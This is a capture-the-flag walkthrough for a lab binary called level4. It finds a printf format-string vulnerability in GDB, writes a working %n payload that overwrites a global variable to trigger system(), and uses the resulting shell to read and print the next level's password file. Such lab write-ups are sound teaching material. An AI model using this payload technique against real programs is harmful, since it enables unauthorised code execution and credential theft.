# 🚀 Level 4 - Walkthrough
## 🧪 First Step - Testing the Program
```bash
$ ./level4
coucou
coucou
```
- 🧾 The program waits for input and prints it back.

## 🐞 Start it in GDB
```bash
(gdb-peda)$ pdisas main
...
0x080484ad <+6>:		call   0x8048457 <n>
...
```
- 🔍 main calls a function n.

```bash
(gdb-peda)$ pdisas n
...
0x08048488 <+49>:	call   0x8048444 <p>
...
```
- 🧩 fgets reads user input.
- 📢 Function p prints the input.
- 🔐 When the global variable m equals 0x1025544 (decimal 16930116), system() is called.
```bash
(gdb-peda)$ pdisas p
...
0x08048450 <+12>:	call   0x8048340 <printf@plt>
...
```
- ⚠️ printf is called without a format string, which creates a format string vulnerability.

## 🔍 Check Position of Our Buffer on Stack
```bash
$ python -c 'print("BBBB" + " %x"*15)' | ./level4
BBBB b7ff26b0 bffff694 b7fd0ff4 0 0 bffff658 804848d bffff450 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078
```
- 🔢 Our input "BBBB" (0x42424242) appears at the 12th position.

## 🔑 Confirm Address of m
```bash
$ python -c 'print("\x10\x98\x04\x08" + "%12$x")' | ./level4
8049810
```
We can write the address 0x8049810 of m into the input and leak it with %12$x.

## 💥 Exploit with %n Format Specifier
- Goal: write 16930116 into m.
- %n writes the number of printed bytes to the address passed on the stack.

```bash
$ python -c 'print("\x10\x98\x04\x08" + "%16930112d%12$n")' | ./level4
```
- 🛠 Padding %16930112d prints that many characters before %12$n writes that count to m.

## ✅ Final Step - Get Shell and Read Password
```bash
$ (python -c 'print("\x10\x98\x04\x08" + "%16930112d%12$n")'; cat -) | ./level4
whoami
level5
cat ~level5/.pass
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
- 🎉 Done!
